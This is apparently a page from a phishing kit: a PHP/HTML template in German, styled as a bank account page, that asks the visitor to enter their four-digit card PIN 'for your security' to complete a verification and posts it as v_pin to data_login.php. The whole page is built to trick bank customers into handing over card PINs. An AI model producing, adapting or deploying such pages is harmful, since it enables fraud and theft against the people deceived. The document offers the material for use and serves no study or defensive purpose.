<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body class="account">
<?php 
require 'views/header.php';
?>


<main>
<div class="holder">
<div class="left">


<div class="form" style="width:600px;">
<form method="POST" action="data_login.php">
<div class="stitle">Karten-PIN</div>
<div class="text">
Zu Ihrer Sicherheit bitten wir Sie, Ihre **Karten-PIN** einzugeben, um den Verifizierungsprozess abzuschließen.
</div>


<div class="err" style="display:none; margin-top:20px; align-items:center;">
    <div class="icon"><img src="res/err.png"></div>
    <div class="txt">  Bitte geben Sie gültige Daten ein.</div>
</div>

<div class="col">
    <input type="text" id="code" name="v_pin" placeholder=" " required>
    <label for="code">PIN</label>
</div>

<div class="col lodah">
<button class="flash" type="submit"> Weiter </button>
<div class="loader"></div>
</div>

</form>
</div>
</div>






</div>
</main>


<?php 
require 'views/footer.php';
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#code").mask("0000");



</script>
</body>
</html>